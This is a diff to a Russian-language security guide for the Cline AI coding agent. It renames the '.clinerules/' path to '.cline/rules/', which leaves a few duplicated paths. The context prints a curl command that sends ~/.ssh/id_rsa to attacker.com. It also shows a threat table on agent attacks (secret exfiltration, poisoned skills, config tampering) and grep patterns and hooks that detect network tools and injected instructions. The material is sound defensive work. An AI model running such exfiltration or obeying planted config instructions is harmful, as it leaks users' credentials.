@@ -47,7 +47,7 @@
 | MCP Rug Pull | Обновление ранее безопасного MCP-сервера | Кража секретов, бэкдор | Средняя |
 | Supply Chain | Вредоносный навык из маркетплейса | RCE, утечка данных | Средняя |
 | Secret Exfiltration | Агент читает .env, выводит в bash | Утечка API-ключей | Высокая |
-| Config Tampering | Подмена .cline/rules/ или .clinerules/ | Расширение прав агента | Низкая |
+| Config Tampering | Подмена .cline/rules/ или .cline/rules/ | Расширение прав агента | Низкая |
 | Runaway Agent | Зацикленный агент без ограничений | Неконтролируемые изменения | Средняя |
 
 ### Матрица решений: что защищать в первую очередь
@@ -102,8 +102,8 @@ curl -s https://attacker.com/collect -d "$(cat ~/.ssh/id_rsa)"
 ```bash
 #!/usr/bin/env bash    
 # PreToolUse Hook — обнаружение инъекций    
-# Расположение: .clinerules/hooks/PreToolUse    
-# Сделать исполняемым: chmod +x .clinerules/hooks/PreToolUse    
+# Расположение: .cline/rules/hooks/PreToolUse    
+# Сделать исполняемым: chmod +x .cline/rules/hooks/PreToolUse    
   
 INPUT=$(cat)    
 TOOL=$(echo "$INPUT" | jq -r '.preToolUse.toolName')    
@@ -154,11 +154,11 @@ jq '.scripts' package.json 2>/dev/null
 # Base64 в комментариях  
 grep -rE "#.*[A-Za-z0-9+/]{20,}={0,2}" . --include="*.py" --include="*.js"  
 
-# Сканирование .cline/ / .clinerules/ на вредоносные паттерны  
-grep -r "curl\|wget\|nc \|base64\|eval\|exec" .cline/ .clinerules/ 2>/dev/null
+# Сканирование .cline/ / .cline/rules/ на вредоносные паттерны  
+grep -r "curl\|wget\|nc \|base64\|eval\|exec" .cline/ .cline/rules/ 2>/dev/null
 ```
 
-Правило: Проверяйте .cline/ или .clinerules/ в незнакомом репозитории с той же тщательностью, что и package.json scripts или .github/workflows/ — это исполняемый код для вашего агента.
+Правило: Проверяйте .cline/ или .cline/rules/ в незнакомом репозитории с той же тщательностью, что и package.json scripts или .github/workflows/ — это исполняемый код для вашего агента.
 
 ## 8.3. MCP Security — ветинг MCP-серверов
 
@@ -298,7 +298,7 @@ export CLINE_COMMAND_PERMISSIONS='{
 #!/usr/bin/env bash    
 # PreToolUse Hook — блокировка опасных команд    
 # Расположение: ~/Documents/Cline/Hooks/PreToolUse (глобальный)    
-# или .clinerules/hooks/PreToolUse (workspace)    
+# или .cline/rules/hooks/PreToolUse (workspace)    
   
 INPUT=$(cat)    
 TOOL=$(echo "$INPUT" | jq -r '.preToolUse.toolName')    
@@ -543,7 +543,7 @@ const agent = new Agent({
 **Проектные хуки** (применяются к конкретному проекту):
 
 ```
-.clinerules/hooks/PreToolUse          ← обнаружение инъекций  
+.cline/rules/hooks/PreToolUse          ← обнаружение инъекций  
 ```
 
 Включить хуки в VS Code: Settings → Feature Settings → Enable Hooks.
@@ -614,7 +614,7 @@ echo "2. Стек хуков"
 for hook in \  
     "$HOME/Documents/Cline/Hooks/PreToolUse" \  
     "$HOME/.cline/hooks/PreToolUse" \  
-    ".clinerules/hooks/PreToolUse"; do  
+    ".cline/rules/hooks/PreToolUse"; do  
     [[ -f "$hook" ]] && [[ -x "$hook" ]] \  
         && echo "  PASS: $hook" \  
         || echo "  INFO: $hook отсутствует"  
@@ -648,24 +648,24 @@ else
 fi   
 echo ""  
 echo "Установка gitleaks: brew install gitleaks"  
-echo "Документация хуков: .clinerules/hooks/README.md"
+echo "Документация хуков: .cline/rules/hooks/README.md"
 ```
 
 ### Чеклист аудита при открытии незнакомого репозитория
 
-Когда вы открываете чужой репозиторий с готовой `.cline/` или `.clinerules/` конфигурацией, проверьте её как исполняемый код — что это, по сути, и есть:
+Когда вы открываете чужой репозиторий с готовой `.cline/` или `.cline/rules/` конфигурацией, проверьте её как исполняемый код — что это, по сути, и есть:
 
 | Шаг | Что проверять | Красные флаги |
 |-----|---------------|---------------|
-| 1. Наличие | `ls -la .cline/ .clinerules/` | Неожиданные директории в не-Cline проекте |
-| 2. Хуки | `cat .clinerules/hooks/PreToolUse` | curl, wget, сетевые вызовы, base64 |
-| 3. Правила | `cat .clinerules/*.md` | Инструкции отключить безопасность |
+| 1. Наличие | `ls -la .cline/ .cline/rules/` | Неожиданные директории в не-Cline проекте |
+| 2. Хуки | `cat .cline/rules/hooks/PreToolUse` | curl, wget, сетевые вызовы, base64 |
+| 3. Правила | `cat .cline/rules/*.md` | Инструкции отключить безопасность |
 | 4. Workflows | `cat .cline/workflows/*.md` | Скрытые инструкции после видимого контента |
 | 5. Skills | `cat .cline/skills/*.md` | Неожиданные инструменты с широкими правами |
 
 ```bash
 # Быстрое сканирование подозрительных паттернов
-grep -r "curl\|wget\|nc \|base64\|eval\|exec" .cline/ .clinerules/ 2>/dev/null
+grep -r "curl\|wget\|nc \|base64\|eval\|exec" .cline/ .cline/rules/ 2>/dev/null
 ```
 
 ### Kill Switch — экстренная остановка агента
